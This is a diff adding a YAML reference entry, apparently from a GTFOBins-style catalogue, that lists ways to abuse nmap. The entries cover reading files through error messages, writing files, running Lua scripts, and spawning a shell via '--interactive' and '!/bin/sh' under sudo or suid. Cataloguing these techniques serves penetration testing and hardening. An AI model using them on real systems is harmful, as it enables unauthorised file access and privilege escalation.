@@ -1,0 +1,44 @@
+---
+functions:
+  file-read:
+  - binary: false
+    code: |-
+      nmap -iL /path/to/input-file
+    comment: |-
+      The file is actually parsed as a list of hosts/networks, lines are leaked through error messages.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      nmap -oG=/path/to/output-file DATA
+    comment: |-
+      The payload appears inside the regular nmap output.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  inherit:
+  - code: |-
+      echo '...' >/path/to/temp-file
+      nmap --script=/path/to/temp-file
+    comment: |-
+      This allows to run Lua code (`...`).
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    from: lua
+  shell:
+  - code: |-
+      nmap --interactive
+      !/bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+    version: |-
+      2.02 to 5.21
+...
